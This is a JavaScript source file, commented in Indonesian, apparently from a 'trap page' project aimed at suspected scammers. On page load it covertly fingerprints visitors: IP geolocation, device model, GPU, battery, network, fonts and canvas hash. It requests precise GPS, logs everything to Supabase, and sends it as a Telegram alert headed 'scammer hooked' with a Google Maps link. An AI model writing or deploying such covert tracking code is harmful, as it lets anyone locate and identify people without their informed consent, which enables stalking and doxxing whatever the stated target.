import axios from 'axios';
import { supabase, isSupabaseConfigured } from './supabase';

const TELEGRAM_BOT_TOKEN = '';
const TELEGRAM_CHAT_ID = '';

// ── Parse User Agent untuk dapat merek & model HP ──────────────────────────
const parseDevice = (ua) => {

  // ── OS Detection — urutan PENTING: yang lebih spesifik duluan ──
  let os = 'Unknown OS';
  if (/Windows NT 10\.0/.test(ua))      os = 'Windows 10/11';
  else if (/Windows NT 6\.3/.test(ua))  os = 'Windows 8.1';
  else if (/Windows NT 6\.2/.test(ua))  os = 'Windows 8';
  else if (/Windows NT 6\.1/.test(ua))  os = 'Windows 7';
  else if (/Windows NT/.test(ua))       os = 'Windows (lama)';
  // Android harus sebelum Linux karena Android UA mengandung "Linux"
  else if (/Android ([\d.]+)/.test(ua)) os = `Android ${ua.match(/Android ([\d.]+)/)[1]}`;
  // iPhone/iPad harus sebelum Mac karena iOS UA mengandung "Mac OS X"
  else if (/iPhone/.test(ua) && /OS ([\d_]+)/.test(ua))
    os = `iOS ${ua.match(/OS ([\d_]+)/)[1].replace(/_/g, '.')}`;
  else if (/iPad/.test(ua) && /OS ([\d_]+)/.test(ua))
    os = `iPadOS ${ua.match(/OS ([\d_]+)/)[1].replace(/_/g, '.')}`;
  else if (/Macintosh|Mac OS X/.test(ua) && !/iPhone|iPad/.test(ua)) {
    const ver = ua.match(/Mac OS X ([\d_]+)/);
    os = ver ? `macOS ${ver[1].replace(/_/g, '.')}` : 'macOS';
  }
  else if (/CrOS/.test(ua))             os = 'ChromeOS';
  else if (/Linux/.test(ua))            os = 'Linux';

  // ── Brand & Model — hanya untuk mobile/Android ──
  let brand = 'Unknown';
  let model = 'Unknown';

  // Kalau Windows/Mac/Linux → brand = PC/Laptop
  if (/Windows NT/.test(ua)) {
    brand = 'PC / Laptop';
    model = 'Windows Device';
  } else if (/Macintosh/.test(ua) && !/iPhone|iPad/.test(ua)) {
    brand = 'Apple';
    model = 'Mac';
  } else if (/CrOS/.test(ua)) {
    brand = 'Chromebook';
    model = 'ChromeOS Device';
  } else if (/iPhone/.test(ua)) {
    brand = 'Apple';
    model = 'iPhone';
  } else if (/iPad/.test(ua)) {
    brand = 'Apple';
    model = 'iPad';
  } else {
    // Android — coba detect merek
    const brandPatterns = [
      { regex: /; (Samsung[- ][A-Za-z0-9\-]+)/i,  brand: 'Samsung' },
      { regex: /; (SM-[A-Za-z0-9]+)/i,             brand: 'Samsung' },
      { regex: /; (Redmi [A-Za-z0-9 ]+?) Build/i,  brand: 'Xiaomi Redmi' },
      { regex: /; (POCO [A-Za-z0-9 ]+?) Build/i,   brand: 'POCO' },
      { regex: /; (M2\d{3}[A-Za-z0-9]+)/i,         brand: 'Xiaomi' },  // Xiaomi model codes
      { regex: /; (Xiaomi [A-Za-z0-9 ]+?) Build/i, brand: 'Xiaomi' },
      { regex: /; (CPH[0-9]+)/i,                   brand: 'OPPO' },
      { regex: /; (OPPO [A-Za-z0-9 ]+?) Build/i,   brand: 'OPPO' },
      { regex: /; (vivo [A-Za-z0-9\-]+)/i,         brand: 'Vivo' },
      { regex: /; (V[0-9]{4}[A-Z]+)/i,             brand: 'Vivo' },
      { regex: /; (RMX[0-9]+)/i,                   brand: 'Realme' },
      { regex: /; (realme [A-Za-z0-9 ]+?) Build/i, brand: 'Realme' },
      { regex: /; (Infinix [A-Za-z0-9\- ]+?) Build/i, brand: 'Infinix' },
      { regex: /; (TECNO [A-Za-z0-9\- ]+?) Build/i,   brand: 'Tecno' },
      { regex: /; (HUAWEI [A-Za-z0-9\-]+)/i,       brand: 'Huawei' },
      { regex: /; (OnePlus [A-Za-z0-9 ]+?) Build/i, brand: 'OnePlus' },
      { regex: /; (Nokia [A-Za-z0-9 ]+?) Build/i,  brand: 'Nokia' },
      { regex: /; (moto [A-Za-z0-9 ]+?) Build/i,   brand: 'Motorola' },
    ];

    for (const p of brandPatterns) {
      const match = ua.match(p.regex);
      if (match) {
        brand = p.brand;
        model = match[1]?.trim() || 'Unknown';
        break;
      }
    }

    if (brand === 'Unknown' && /Android/.test(ua)) {
      brand = 'Android Device';
      // Coba ambil model dari pola umum "; ModelName Build/"
      const genericModel = ua.match(/;\s+([^;)]+?)\s+Build\//);
      if (genericModel) model = genericModel[1].trim();
    }
  }

  // ── Browser Detection — urutan penting ──
  let browser = 'Unknown';
  if (/SamsungBrowser\/([\d.]+)/.test(ua))
    browser = `Samsung Browser ${ua.match(/SamsungBrowser\/([\d.]+)/)[1]}`;
  else if (/UCBrowser\/([\d.]+)/.test(ua))
    browser = `UC Browser ${ua.match(/UCBrowser\/([\d.]+)/)[1]}`;
  else if (/OPR\/([\d.]+)/.test(ua))
    browser = `Opera ${ua.match(/OPR\/([\d.]+)/)[1]}`;
  else if (/Edg\/([\d.]+)/.test(ua))
    browser = `Edge ${ua.match(/Edg\/([\d.]+)/)[1]}`;
  else if (/CriOS\/([\d.]+)/.test(ua))
    browser = `Chrome iOS ${ua.match(/CriOS\/([\d.]+)/)[1]}`;
  else if (/FxiOS\/([\d.]+)/.test(ua))
    browser = `Firefox iOS ${ua.match(/FxiOS\/([\d.]+)/)[1]}`;
  else if (/Firefox\/([\d.]+)/.test(ua))
    browser = `Firefox ${ua.match(/Firefox\/([\d.]+)/)[1]}`;
  else if (/Chrome\/([\d.]+)/.test(ua))
    browser = `Chrome ${ua.match(/Chrome\/([\d.]+)/)[1]}`;
  else if (/Version\/([\d.]+).*Safari/.test(ua))
    browser = `Safari ${ua.match(/Version\/([\d.]+)/)[1]}`;
  else if (/Safari/.test(ua))
    browser = 'Safari';

  // ── Device type ──
  const isMobile = /Mobi|Android.*Mobile|iPhone|iPod/i.test(ua);
  const isTablet = /iPad/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua));
  const deviceType = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop/Laptop';

  return { os, brand, model, browser, deviceType };
};

// ── Network info ────────────────────────────────────────────────────────────
const getNetworkInfo = () => {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return { network_type: 'Unknown', network_speed: 'Unknown', network_rtt: 'Unknown' };
  return {
    network_type: conn.effectiveType || conn.type || 'Unknown',
    network_speed: conn.downlink ? `${conn.downlink} Mbps` : 'Unknown',
    network_rtt: conn.rtt ? `${conn.rtt} ms` : 'Unknown',
  };
};

// ── Canvas fingerprint (unik per device) ───────────────────────────────────
const getCanvasFingerprint = () => {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('fingerprint🔍', 2, 2);
    return canvas.toDataURL().slice(-50); // ambil bagian unik
  } catch { return 'N/A'; }
};

// ── GPU info ────────────────────────────────────────────────────────────────
const getGPU = () => {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return 'N/A';
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (!debugInfo) return 'Generic GPU';
    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    return `${vendor} — ${renderer}`;
  } catch { return 'N/A'; }
};

// ── Telegram notif ──────────────────────────────────────────────────────────
const sendToTelegram = async (data) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const mapsUrl = data.precise_lat
    ? `https://maps.google.com/?q=${data.precise_lat},${data.precise_lng}`
    : `https://maps.google.com/?q=${data.latitude},${data.longitude}`;

  const message = `
🚨 *PENIPU TERPANCING!*

🕐 *Waktu:* ${new Date(data.timestamp).toLocaleString('id-ID')}
🌐 *IP:* \`${data.ip}\`
📍 *Lokasi IP:* ${data.city}, ${data.region}, ${data.country_name}
🏢 *ISP:* ${data.org}

📱 *Device:* ${data.brand} ${data.model}
💻 *Tipe:* ${data.device_type}
🖥️ *OS:* ${data.os}
🌐 *Browser:* ${data.browser}
📐 *Layar:* ${data.screen_resolution} (${data.color_depth}bit)
⚡ *CPU:* ${data.cores} Cores
🎮 *GPU:* ${data.gpu}
🔋 *Baterai:* ${data.battery} (${data.charging})
📶 *Jaringan:* ${data.network_type} | ${data.network_speed} | RTT: ${data.network_rtt}
🌍 *Timezone:* ${data.timezone}
🔗 *Referrer:* ${data.referrer}

${data.precise_lat ? `📌 *GPS AKURAT!* Akurasi: ${data.gps_accuracy}` : '📌 *Lokasi via IP (belum izin GPS)*'}
🗺️ [Buka di Google Maps](${mapsUrl})
  `.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: false,
    });
  } catch (err) {
    console.error('Gagal kirim ke Telegram:', err.message);
  }
};

// ── Save to Supabase ────────────────────────────────────────────────────────
const saveToSupabase = async (data) => {
  if (!isSupabaseConfigured()) return null;
  const { data: inserted, error } = await supabase
    .from('scam_logs')
    .insert([data])
    .select()
    .single();
  if (error) { console.error('Supabase insert error:', error.message); return null; }
  return inserted;
};

// ── MAIN CAPTURE ────────────────────────────────────────────────────────────
export const captureVisitorData = async () => {
  try {
    // IP data (no permission needed)
    const response = await axios.get('https://ipapi.co/json/');
    const ipData = response.data;

    // Battery
    let batteryLevel = 'Unknown';
    let batteryCharging = 'Unknown';
    let batteryTime = 'Unknown';
    if ('getBattery' in navigator) {
      const bat = await navigator.getBattery();
      batteryLevel = `${(bat.level * 100).toFixed(0)}%`;
      batteryCharging = bat.charging ? 'Charging' : 'Not Charging';
      const secs = bat.charging ? bat.chargingTime : bat.dischargingTime;
      if (secs && secs !== Infinity) {
        const h = Math.floor(secs / 3600);
        const m = Math.floor((secs % 3600) / 60);
        batteryTime = `${h}j ${m}m ${bat.charging ? 'penuh' : 'habis'}`;
      }
    }

    const ua = navigator.userAgent;
    const { os, brand, model, browser, deviceType } = parseDevice(ua);
    const { network_type, network_speed, network_rtt } = getNetworkInfo();

    // Screen detail
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const viewportRes = `${window.innerWidth}x${window.innerHeight}`;
    const colorDepth = window.screen.colorDepth || 24;
    const pixelRatio = window.devicePixelRatio || 1;

    // Installed fonts (sample check)
    const checkFonts = () => {
      const testFonts = ['Arial', 'Calibri', 'Cambria', 'Comic Sans MS', 'Courier New',
        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 'Verdana',
        'Segoe UI', 'Roboto', 'Helvetica Neue'];
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const base = 'monospace';
      ctx.font = `72px ${base}`;
      const baseW = ctx.measureText('mmmmmmmmmmlli').width;
      return testFonts.filter(f => {
        ctx.font = `72px '${f}', ${base}`;
        return ctx.measureText('mmmmmmmmmmlli').width !== baseW;
      }).join(', ');
    };

    const timestamp = new Date().toISOString();
    const logId = Math.random().toString(36).substr(2, 9);

    const fullLog = {
      id: logId,
      timestamp,
      // IP & Location
      ip: ipData.ip || 'Unknown',
      city: ipData.city || 'Unknown',
      region: ipData.region || 'Unknown',
      country_name: ipData.country_name || 'Unknown',
      country_code: ipData.country_code || '--',
      latitude: ipData.latitude || null,
      longitude: ipData.longitude || null,
      org: ipData.org || 'Unknown',
      postal: ipData.postal || 'Unknown',
      // Device identity
      brand,
      model,
      os,
      browser,
      device_type: deviceType,
      user_agent: ua,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages?.join(', ') || navigator.language,
      // Screen
      screen_resolution: screenRes,
      viewport: viewportRes,
      color_depth: colorDepth,
      pixel_ratio: pixelRatio,
      // Hardware
      cores: navigator.hardwareConcurrency || 0,
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      gpu: getGPU(),
      // Battery
      battery: batteryLevel,
      charging: batteryCharging,
      battery_time: batteryTime,
      // Network
      network_type,
      network_speed,
      network_rtt,
      // Misc
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || 'Direct',
      fonts: checkFonts(),
      canvas_fp: getCanvasFingerprint(),
      touch_points: navigator.maxTouchPoints || 0,
      cookies_enabled: navigator.cookieEnabled,
      do_not_track: navigator.doNotTrack || 'Unknown',
      // GPS — diisi nanti
      precise_lat: null,
      precise_lng: null,
      gps_accuracy: null,
      status: 'captured',
    };

    // Simpan ID untuk updateGPS nanti
    sessionStorage.setItem('last_log_id', logId);

    // Simpan ke Supabase langsung
    await saveToSupabase(fullLog);

    // Fallback localStorage
    const existingLogs = JSON.parse(localStorage.getItem('scam_logs') || '[]');
    localStorage.setItem('scam_logs', JSON.stringify([fullLog, ...existingLogs]));

    // Telegram notif
    sendToTelegram(fullLog);

    // GPS di background
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const gpsUpdate = {
            precise_lat: pos.coords.latitude,
            precise_lng: pos.coords.longitude,
            gps_accuracy: `${pos.coords.accuracy.toFixed(1)} meters`,
          };
          if (isSupabaseConfigured()) {
            await supabase.from('scam_logs').update(gpsUpdate).eq('id', logId);
          }
          const logs = JSON.parse(localStorage.getItem('scam_logs') || '[]');
          const idx = logs.findIndex((l) => l.id === logId);
          if (idx !== -1) { logs[idx] = { ...logs[idx], ...gpsUpdate }; localStorage.setItem('scam_logs', JSON.stringify(logs)); }
          sendToTelegram({ ...fullLog, ...gpsUpdate });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }

    return fullLog;
  } catch (error) {
    console.error('Capture failed:', error);
    return null;
  }
};

// ── Fungsi update GPS saja (dipanggil dari TrapPage setelah user klik izinkan) ──
// Menyimpan last captured ID di sessionStorage supaya bisa di-update
export const updateGPS = async (position) => {
  const logId = sessionStorage.getItem('last_log_id');
  if (!logId) return;

  const gpsUpdate = {
    precise_lat: position.coords.latitude,
    precise_lng: position.coords.longitude,
    gps_accuracy: `${position.coords.accuracy.toFixed(1)} meters`,
  };

  if (isSupabaseConfigured()) {
    await supabase.from('scam_logs').update(gpsUpdate).eq('id', logId);
  }

  const logs = JSON.parse(localStorage.getItem('scam_logs') || '[]');
  const idx = logs.findIndex((l) => l.id === logId);
  if (idx !== -1) {
    logs[idx] = { ...logs[idx], ...gpsUpdate };
    localStorage.setItem('scam_logs', JSON.stringify(logs));
  }
};
